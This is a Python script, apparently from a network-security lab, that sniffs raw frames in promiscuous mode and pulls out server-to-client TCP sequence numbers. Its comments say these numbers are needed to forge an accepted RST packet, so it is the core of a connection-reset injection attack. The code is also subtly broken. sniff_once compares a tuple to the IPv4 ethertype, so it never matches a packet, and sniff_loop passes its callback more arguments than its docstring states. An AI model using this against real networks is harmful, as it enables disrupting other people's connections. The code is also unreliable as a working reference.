#!/usr/bin/env python3
"""
sniffer.py
Sniffs the server->client TCP flow and returns the last seen
sequence number, payload length, and ports.
Run as root: sudo python3 sniffer.py
"""

import socket
import struct

# Configuration
SERVER_IP   = "192.168.56.10"
CLIENT_IP   = "192.168.56.11"
SERVER_PORT = 8000
IFACE       = "enp0s8"

ETH_HDR_LEN = 14   # Ethernet header is always 14 bytes
IP_PROTO_TCP = 6   # protocol number for TCP in the IP header


def parse_ethernet(frame):
    dst_mac, src_mac, ethertype = struct.unpack("!6s6sH", frame[:14])
    return ethertype, src_mac, dst_mac

def parse_ip(packet):
    # IP header first 20 bytes (fixed part)
    # Format: version+IHL, DSCP, total_length, id, flags+frag,
    #         TTL, protocol, checksum, src_ip, dst_ip
    fields = struct.unpack("!BBHHHBBH4s4s", packet[:20])
    version_ihl  = fields[0]
    total_length = fields[2]
    protocol     = fields[6]
    src_ip       = socket.inet_ntoa(fields[8])
    dst_ip       = socket.inet_ntoa(fields[9])

    # IHL (Internet Header Length) is the lower 4 bits of the first byte
    # It counts 32-bit words, so multiply by 4 to get bytes
    # e.g. IHL=5 means 5 x 4 = 20 bytes (no options)
    ihl_bytes = (version_ihl & 0x0F) * 4

    return ihl_bytes, protocol, src_ip, dst_ip, total_length


def parse_tcp(segment):
    # TCP header first 20 bytes (fixed part)
    # Format: src_port, dst_port, seq, ack,
    #         data_offset+reserved, flags, window, checksum, urgent
    fields = struct.unpack("!HHIIBBHHH", segment[:20])
    src_port        = fields[0]
    dst_port        = fields[1]
    seq             = fields[2]   # sequence number of first byte in this segment
    data_offset     = fields[4]   # upper 4 bits = TCP header length in 32-bit words
    flags           = fields[5]   # RST=0x04, SYN=0x02, FIN=0x01, ACK=0x10

    # Same idea as IP IHL: upper 4 bits x 4 = header length in bytes
    tcp_hdr_len = (data_offset >> 4) * 4

    return src_port, dst_port, seq, tcp_hdr_len


def sniff_once():
    """
    Sniff until we see one server->client data packet (payload > 0).
    Returns (seq, next_seq, client_port) so the RST builder knows
    exactly what to put in the forged packet.
    """
    # AF_PACKET + SOCK_RAW lets us receive raw Ethernet frames
    # ntohs(0x0003) = ETH_P_ALL: capture every frame on the interface
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                         socket.ntohs(0x0003))
    sock.bind((IFACE, 0))

    import ctypes
    SIOCGIFFLAGS = 0x8913
    SIOCSIFFLAGS = 0x8914
    IFF_PROMISC  = 0x100

    import struct as _struct
    ifreq = _struct.pack('16sh', IFACE.encode(), 0)
    import fcntl
    ifreq = fcntl.ioctl(sock.fileno(), SIOCGIFFLAGS, ifreq)
    flags = _struct.unpack('16sh', ifreq)[1]
    flags |= IFF_PROMISC
    ifreq = _struct.pack('16sh', IFACE.encode(), flags)
    fcntl.ioctl(sock.fileno(), SIOCSIFFLAGS, ifreq)

    print(f"[*] Sniffing on {IFACE} ...")
    print(f"[*] Waiting for {SERVER_IP}:{SERVER_PORT} -> {CLIENT_IP} ...")

    while True:
        frame, _ = sock.recvfrom(65535)

        # --- Ethernet layer ---
        ethertype = parse_ethernet(frame)
        if ethertype != 0x0800:      # not IPv4, skip
            continue

        # --- IP layer ---
        ip_packet = frame[ETH_HDR_LEN:]
        ihl, proto, src_ip, dst_ip, total_len = parse_ip(ip_packet)

        if proto != IP_PROTO_TCP:    # not TCP, skip
            continue
        if src_ip != SERVER_IP:      # not from server, skip
            continue
        if dst_ip != CLIENT_IP:      # not to client, skip
            continue

        # --- TCP layer ---
        tcp_segment = ip_packet[ihl:]
        src_port, dst_port, seq, tcp_hdr_len = parse_tcp(tcp_segment)

        if src_port != SERVER_PORT:  # not from port 8000, skip
            continue

        # Payload length = IP total length - IP header - TCP header
        # If zero this is a pure ACK or SYN — not useful for us
        payload_len = total_len - ihl - tcp_hdr_len
        if payload_len <= 0:
            continue

        # next_seq is the sequence number the client expects next.
        # This is the value our forged RST must carry to be accepted.
        next_seq = seq + payload_len

        print(f"[+] Caught data packet!")
        print(f"    src={src_ip}:{src_port}  dst={dst_ip}:{dst_port}")
        print(f"    seq={seq}  payload={payload_len}  next_seq={next_seq}")

        sock.close()
        return seq, next_seq, dst_port   # dst_port = client's ephemeral port


def sniff_loop(callback):
    """
    Sniff continuously, calling callback(seq, next_seq, client_port)
    for every server->client data packet.
    """
    import fcntl
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                         socket.ntohs(0x0003))
    sock.bind((IFACE, 0))

    # Enable promiscuous mode
    SIOCGIFFLAGS = 0x8913
    SIOCSIFFLAGS = 0x8914
    IFF_PROMISC  = 0x100
    ifreq = struct.pack('16sh', IFACE.encode(), 0)
    ifreq = fcntl.ioctl(sock.fileno(), SIOCGIFFLAGS, ifreq)
    flags = struct.unpack('16sh', ifreq)[1] | IFF_PROMISC
    ifreq = struct.pack('16sh', IFACE.encode(), flags)
    fcntl.ioctl(sock.fileno(), SIOCSIFFLAGS, ifreq)

    print(f"[*] Sniffing loop on {IFACE} ...")

    while True:
        frame, _ = sock.recvfrom(65535)

        ethertype, src_mac, dst_mac = parse_ethernet(frame)
        if ethertype != 0x0800:
            continue

        ip_packet = frame[ETH_HDR_LEN:]
        ihl, proto, src_ip, dst_ip, total_len = parse_ip(ip_packet)

        if proto != IP_PROTO_TCP:
            continue
        if src_ip != SERVER_IP or dst_ip != CLIENT_IP:
            continue

        tcp_segment = ip_packet[ihl:]
        src_port, dst_port, seq, tcp_hdr_len = parse_tcp(tcp_segment)

        if src_port != SERVER_PORT:
            continue

        payload_len = total_len - ihl - tcp_hdr_len
        if payload_len <= 0:
            continue

        next_seq = seq + payload_len
        # Call the callback with fresh values every packet
        callback(seq, next_seq, dst_port, src_mac, dst_mac)

if __name__ == "__main__":
    sniff_once()